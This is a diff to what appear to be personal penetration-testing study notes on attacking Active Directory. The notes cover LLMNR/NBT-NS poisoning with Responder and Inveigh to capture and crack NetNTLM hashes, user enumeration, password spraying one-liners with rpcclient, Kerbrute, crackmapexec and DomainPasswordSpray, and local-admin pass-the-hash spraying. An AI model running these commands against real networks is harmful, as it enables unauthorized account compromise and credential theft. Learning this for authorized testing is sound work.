@@ -156,13 +156,16 @@ Common ports used by services that `enum4linux` can access
 # Enumeration
 
 ## AD Host Enumeration
+
+See [[Enumeration#Enumerating the Network]] for more help
+Once you have used the techniques below to identify hosts, use `nmap -A` to see if you can enumerate the name of the DC
 ### LLMNR & NBT-NS Primer
 
 Link-Local Multicast Name Resolution and NetBIOS Name Service are an alternate method of host identification that can be used when DNS fails. LLMNR is UDP 5355. LLMNR/NBT-NS allows any host on the network to respond, meaning we can easily spoof if we have access to the network.
 
 The goal is get the victim to communicate with our system and capture the NetNTLM hash for cracking.
 
-### Using Responder (from a Linux host)
+#### Using Responder (from a Linux host)
 
 `sudo responder -I [interface]`
 - `-A` analyze mode, allows us to see NBT-NS or LLMNR requests without poisoning (just for recon, not useful for conducting this attack)
@@ -172,7 +175,7 @@ The goal is get the victim to communicate with our system and capture the NetNTL
 - Crack NTLMv2 hash with `hashcat -m 5600`
 - logs are stored in `/usr/share/responder/logs`
 
-### Using Inveigh (from a Windows host)
+#### Using Inveigh (from a Windows host)
 
 - https://github.com/Kevin-Robertson/Inveigh
 - `Import-Module \.Inveigh.ps1`
@@ -182,12 +185,12 @@ The goal is get the victim to communicate with our system and capture the NetNTL
 	- run the program, and then press `ESC` to enter the interactive console
 	- `GET NTLMV2UNIQUE`
 	- `GET NTLMV2USERNAMES`
-
 ## AD User/Password Attacks
 
-AD specific wordlists 
-- `jsmith.txt` or `jsmith2.txt` username lists from `Insidetrust` https://github.com/insidetrust/statistically-likely-usernames
+### Enumerate Users
 
+AD specific wordlists 
+- `jsmith.txt` or `jsmith2.txt` username lists from `Insidetrust` https://github.com/insidetrust/statistically-likely-usernames are common AD formats
 
 Enumerate users and password policies
 - `Kerbrute` https://github.com/ropnop/kerbrute.git
@@ -211,8 +214,41 @@ Enumerate users and password policies
 - If authenticated on a Windows host:
 	- `net accounts`
 
-Once you have found a valid set of credenti through enumerating and password spraying, use `crackmapexec` to get a valid user list
+Once you have found a valid set of credentials through enumerating and password spraying, use `crackmapexec` to get a valid user list
 - `sudo crackmapexec smb [IP] -u [valid_user] -p [valid_pass] --users`
+
+
+### Password Spraying
+
+It's common for local administrator accounts across a network to use similar credentials. If you find a set of credentials for a local admin account, spray across other machines in the domain. See under `crackmapexec`
+
+#### From Linux
+
+`Rpcclient`
+- `Rpcclient` will not immediately show you a successful login, but you can `grep` for `Authority` in the response.
+- One Liner: `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`
+
+`Kerbrute`
+- `kerbrute passwordspray -d [domain] --dc [IP] user_list.txt [password]`
+
+`Crackmapexec`
+- helpful to use `sudo`
+- `sudo crackmapexec smb [IP] -u user_list.txt -p password1 | grep +`
+- we `grep +` to filter out login failures
+- `--continue-on-success` if needed to test all users
+- Validate your finding by using `crackmapexec` again but with the proper login
+- For spraying local admin accounts across many hosts:
+	- `sudo crackmapexec smb --local-auth [IP] -u user -H [NTLM hash]`
+	- `--local-auth` is necessary to prevent account lockouts by only trying to authenticate to the local account and not the domain account.
+
+#### From Windows
+
+`DomainPasswordSpray`
+- https://github.com/dafthack/DomainPasswordSpray
+- If the host is domain-joined you can skip using `-UserList` as the tool will enumerate users for you
+- `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile [file] -ErrorAction SilentlyContinue`
+
+`Kerbrute` is available on Windows as well
 
 
 # Pass the Hash
